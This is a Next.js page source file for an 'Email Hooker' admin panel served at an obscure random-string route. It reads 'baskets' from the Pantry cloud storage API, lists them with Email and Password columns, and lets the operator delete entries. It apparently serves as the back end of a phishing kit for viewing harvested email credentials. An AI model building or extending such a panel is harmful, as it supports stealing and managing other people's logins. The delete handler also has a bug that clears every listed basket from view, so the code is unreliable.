import React, { useState } from 'react'
import Link from 'next/link'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { faTrash } from '@fortawesome/free-solid-svg-icons'
import Head from 'next/head'


const Index = (props) => {


    const [Baskets, setBaskets] = useState(props.data.baskets)

    const Refresh = () => {


        fetch(`https://getpantry.cloud/apiv1/pantry/${process.env.NEXT_PUBLIC_PANTRY_KEY}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'POST,PATCH,OPTIONS'
            },
        })
            .then((response) => response.json())

            .then((data) => {
                console.log(data)

                setBaskets(data.baskets)

            })
            .catch((error) => {
                console.error('Error:', error);
                alert("Server busy. Try again later")
            });

    }


    const deleteBasket = (BasketName) => {


        if (confirm(`Delete "${BasketName}" permanently ??`)) {


            fetch(`https://getpantry.cloud/apiv1/pantry/${process.env.NEXT_PUBLIC_PANTRY_KEY}/basket/${BasketName}`, {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'POST,PATCH,OPTIONS'
                },
            })
                .then((response) => {
                    console.log(response)
                    Baskets.map((e, i) => {

                        setBaskets(
                            Baskets.filter(a => a.name !== e.name)
                        );

                    })
                })
                .catch((error) => {
                    console.error('Error:', error);
                    alert("Server busy. Try again later")

                });

        }

        else {


        }

    }


    return (
        <>

            <Head>
                <title>
                    Email hooker - plane
                </title>
            </Head>

            <nav className="bg-white border-gray-200 px-2 sm:px-4 py-2.5 dark:bg-gray-900">
                <div className="container flex flex-wrap items-center justify-between mx-auto">
                    <Link href="/" className="flex items-center">
                        <span className="self-center text-xl font-semibold whitespace-nowrap dark:text-white">Email Hooker</span>
                    </Link>

                    <div className="hidden w-full md:block md:w-auto" id="navbar-default">
                        <ul className="flex flex-col p-4 mt-4 border border-gray-100 rounded-lg bg-gray-50 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
                            <li>
                                <Link href="/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj" className="block text-xl py-2 pl-3 pr-4 text-white bg-blue-700 rounded md:bg-transparent md:p-0 dark:text-white" >Home</Link>
                            </li>

                        </ul>
                    </div>
                </div>
            </nav>


            <div className="relative overflow-x-auto md:m-8 m-1">
                <table className="w-full text-sm text-left text-gray-500 dark:text-gray-400">
                    <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                        <tr>
                            <th scope="col" className="md:px-6 px-2 py-3">
                                Basket Name
                            </th>
                            <th scope="col" className="md:px-6 px-2 py-3">
                                Email
                            </th>
                            <th scope="col" className="md:px-6 px-2 py-3">
                                Password
                            </th>
                            <th scope="col" className="text-center px-4 py-3">
                                Delete
                            </th>
                        </tr>
                    </thead>
                    <tbody>
                        {
                            Baskets.map((e, i) => {
                                return (
                                    <tr className="bg-white border-b dark:bg-gray-800 dark:border-gray-700 " key={i}>
                                        <th scope="row" className="cursor-pointer md:px-6 px-2 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
                                            <Link href={`/9W1vw0PcCYNaXV6Pl3K4MgsjXQBsT2Gj/${e.name}`}>
                                                <p className='hover:text-cyan-200'>
                                                    {e.name}
                                                </p>
                                            </Link>
                                        </th>
                                        <td className="md:px-6  px-2 py-4">
                                            ****
                                        </td>
                                        <td className="md:px-6  px-2 py-4">
                                            ****
                                        </td>
                                        <td className=" py-4  text-center cursor-pointer hover:text-red-500 duration-300 " onClick={() => deleteBasket(e.name)}>
                                            <FontAwesomeIcon className='hover:text-red-500 duration-300' icon={faTrash} />
                                            {/* <p className='hover:text-red-500 duration-300' >Delete</p> */}
                                        </td>

                                    </tr>

                                )

                            })
                        }
                    </tbody>

                </table>
                <div className=" md:my-5 my-2 flex justify-start gap-4">

                    <button onClick={Refresh} type="button" className="focus:outline-none text-white bg-green-700 hover:bg-green-800 focus:ring-4 focus:ring-green-300 font-medium rounded-[4px] text-sm px-7 py-2.5 ">Refresh</button>


                    <Link href="/">
                        <button type="button" className="focus:outline-none text-white bg-green-700 hover:bg-green-800 focus:ring-4 focus:ring-green-300 font-medium rounded-[4px] text-sm px-7 py-2.5 ">Visit Site</button>
                    </Link>
                </div>

            </div>



        </>
    )
}

export async function getServerSideProps() {


    const res = await fetch(`https://getpantry.cloud/apiv1/pantry/${process.env.NEXT_PUBLIC_PANTRY_KEY}`, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST,PATCH,OPTIONS'
        },
    })

        // }

        // Error handling here!




    const data = await res.json()
    return {
        props: { data }, // will be passed to the page component as props
    }
}

export default Index